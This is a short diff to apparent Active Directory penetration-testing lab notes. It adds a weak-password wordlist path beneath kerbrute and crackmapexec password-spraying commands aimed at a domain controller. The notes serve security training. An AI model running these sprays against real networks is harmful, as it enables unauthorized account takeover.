@@ -13,6 +13,7 @@ kerbrute passwordspray -d inlanefreight.local --dc <DC-IP> valid_users.txt  Welc
 sudo crackmapexec smb <DC-IP> -u valid_users.txt -p Password123 --continue-on-success | grep +
 ```
 
+ **password spray wordlist** : `/usr/share/wordlists/statistically-likely-usernames/weak-corporate-passwords/english-basic.txt`
 ## Local Administrator Password Reuse
 
 
